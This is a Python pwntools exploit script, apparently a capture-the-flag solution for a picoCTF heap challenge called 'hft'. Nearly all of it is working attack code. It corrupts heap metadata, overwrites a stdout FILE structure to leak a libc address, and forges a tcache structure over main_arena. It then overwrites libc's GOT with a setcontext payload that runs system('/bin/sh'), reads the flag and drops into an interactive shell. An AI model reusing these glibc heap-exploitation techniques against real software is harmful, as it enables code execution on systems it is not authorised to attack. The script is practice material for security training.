#!/usr/bin/env python3

from pwn import *
import string
import tqdm
import logging

context.terminal = ["tmux", "splitw", "-h"]
exe = ELF("./hft_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe
#context.log_level='debug'
#logging.getLogger().setLevel(logging.ERROR)

gdbscript = [
    # "b main.c:53"
    "b *main+159",  # instruction after malloc()
    "b *0x5555555552e7", #instruction after gets()
    # "dis 1",
    "commands",
    "silent",
    "end",
    "source ./cmds.py",
    "continue",
    "c", "c", "c", "c", "c", 
    "vmmap", "vmmap_var $rax"
    "set tcache = 0x55555555c000"
]


def conn():
    #return remote('tethys.picoctf.net', 64081)
    argv = [exe.path]
    if args.GDB:
        # r = gdb.debug(argv, gdbscript="\n".join(gdbscript), api=True)
        r = process(argv)
        gdb.attach(r, gdbscript="\n".join(gdbscript))
        return r
    return process(argv)


PKT_OPT_ECHO = 1
MALLOC_THRESHOLD = 0x20000


def malloc(r, size, data, clean=True):
    r.send(pack(size))
    r.sendline(data)
    if clean:
        r.recvline()
        r.recvline()

#https://hackmd.io/@pepsipu/SyqPbk94a
def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        #p64(0), #sz already written by the program
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )



#template from spencerpogo
curr_remote = None 
def main():
    global curr_remote
    r = conn()
    curr_remote = r 

    r.recvline()

    # prev size of top chunk: 0x20970 with PREV_INUSE set so 0x20971
    # set to 0x971 to maintain page alignment and PREV_INUSE
    #malloc(r,0x400-16+0x960+0x280,'a')
    #malloc(r,0xFD50,'a')
    #malloc(r,0xFD70+0x60,flat({0xFD70+0x60: pack(0xff1-0x60)}, length=0xFD70+0x60+8))
    shift=0x980+0x280-0x220
    malloc(r, (0x400 - 16+shift), flat({0x400 - 16+shift: pack(0xd71+0x220)}, length=0x400-16+shift+8))
    malloc(r, 0x1000, b"AAAABBBBCCCCDDDD")

    # allocate a chunk over the mmap threshold
    #malloc(r, 0x0210000, b"AAAABBBBCCCCDDDD")

    # experimentation to get stuff to allocate before tls
    #malloc(r, 0x010000000 - 0x20, b"AAAABBBBCCCCDDDD")
    #malloc(r, 0x000210000 - 0x20, b"DDDDCCCCBBBBAAAA")
    #malloc(r, 0x000210000 - 0x20, b'a'*(0x007c408c400000-0x7c408c1f0010+1)) 0x2106e8
 
    malloc(r, 0x20fd0, b'a'*(0x216e8-8)+b'\x00\x50') # 0x...5000 
    # pray that the last 3 nibbles are correct, then leak 
    malloc(r, 0x10, b'\x00'*(0x7ffff7fad780 - 0x7ffff7fad2f0-0x8)+p32(0xfbad1800)+p32(0)+p64(0)*3+b'\x00', False)

    '''cnt=-1
    byte=None
    b=[]
    for _ in range(3):
        b.append(r.recv(1))
        cnt+=1 
    while b[-1]!=b'\x7f' or b[-2] != b'\xff' or b[-3] != b'\xf7':
        #print(byte)
        byte=r.recv(1)
        b.append(byte)
        cnt+=1 
    print(b,hex(cnt),hex(len(b)))
    exit(0)'''
    #r.recv(498)
    #print(len(r.recv(0x88e2+0x10)))
    #r.recvline()
    #print(r.recvn(0x8912+3))
    #exit(0)
    oll=context.log_level 
    context.log_level='debug'
    r.recvn(0x8912+3-8)    #'''print(r.recv(0x88dd))
    context.log_level=oll
    leak = u64(r.recvn(8))
    print('libc leak =', hex(leak))
    #print(r.recv(0x10))
    #exit(0)'''
    libc.address = leak - 0x21a580
    print('libc.address =', hex(libc.address))
    r.recvuntil(bytes.fromhex('5b  50 4f 4e 47  5f 4f 4b 5d  0a'))
    dest, payload = setcontext32(
        libc, 
        rip=libc.sym['system'], 
        rdi=next(libc.search(b'/bin/sh'))
    )
    #f=FileStructure(null=libc.sym['_IO_wide_data_1'])
    #fpayload = f.write(dest, size=len(payload))
    #malloc(r,0x20, b'\x00'*(0x7ffff7fad780 - 0x7ffff7fad2f0-0x8)+fpayload)

    #malloc(r,0x20,p64(libc.sym['main_arena']+1632)*2)
    #62 more pointers in the bins 
    #allocation is at main_arena+0x670
    bins=b''
    #sz+this pointer 
    bins+=p64(libc.sym['main_arena']+0x670-0x10)
    #60 more pointers 
    cnt=60 
    ptr=libc.sym['main_arena']+0x670-0x10 
    while cnt>0:
        ptr+=0x10 
        cnt -= 2 
        bins+=p64(ptr)*2 
    #fake tcache_perthread_struct
    print('target', hex(dest))
    malloc(r,0x20,bins+p16(1)*64+p64(dest))
    print('allocate second large chunk')
    malloc(r, 0x20fd0, b'a'*(0x426e8-0x8)+p64(libc.address+0x21a560-0x80))
    malloc(r,0x0,payload, False)
    #malloc(r,0x10,payload)
    #r.sendline(payload)
    # pray for shell 
    r.sendline('cat flag*')
    r.interactive()
    return True


if __name__ == "__main__":
    main()
    '''shell = False 
    tryn = 1 
    while not shell:
        print('try #'+str(tryn))
        try:
            shell = main()
        except Exception as e:
            logging.exception('error') 
            curr_remote.close()
        tryn += 1 '''

